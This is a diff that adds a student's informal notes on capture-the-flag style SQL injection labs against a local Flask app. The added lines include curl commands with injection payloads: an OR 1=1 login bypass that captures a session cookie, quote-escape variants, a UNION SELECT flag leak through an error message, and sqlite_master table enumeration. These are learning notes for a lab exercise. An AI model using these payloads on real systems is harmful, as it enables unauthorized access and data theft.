@@ -577,6 +577,36 @@ honestly idk just check class vid and script
 
 ### lab 5b.1 - sql pass to session
 
+- unsanitized SQL query in flask app
+- simple injection
+- app sets session cookie for 'login', use that to curl again and app prints flag
+- do injection to get cookie `curl -c cookies.txt 'http://lab.localhost?username="hi"+or+1=1+--&password=admin'`
+- then use cookie `curl -b cookies.txt 'http://lab.localhost`
+
+### lab 5b.1 - sql pass to session ii
+
+- input escaped by double quote
+- break it then do the same
+- `curl -c cookies.txt 'http://lab.localhost?username="+or+1=1+--&password=admin'`
+- i.e. a single " to break
+
+### lab 5b.3 - unionize
+
+- same double quote escape
+- no added select query in app to get flag, we hv to inject a select query
+- add a union clause and select from flags table
+- when it tries to convert the rowid with int(), it will print the error as the 'rowid' here is the flag string that we selected, so it can't convert a string
+- also a POST request
+- `curl -X POST 'http://lab.localhost' -d 'username="union%20select%20*%20from%20flags%20--&password=admin`
+
+### lab 5b.4 - master union with 64
+
+- flag is base64 encoded and used in a table's name
+- but it's the same unionize vuln
+- so let's get the table name from the sqlite master table - `SELECT name FROM sqlite_master WHERE type='table'`
+- so: `curl 'http://lab.localhost/?query=test"union+select+name+from+sqlite_master+where+type="table"--'`
+- then `base64 -d`
+
 ## Project 04 - continued
 
 ### .16 - arg wars VI - return of the hacker - reattempt
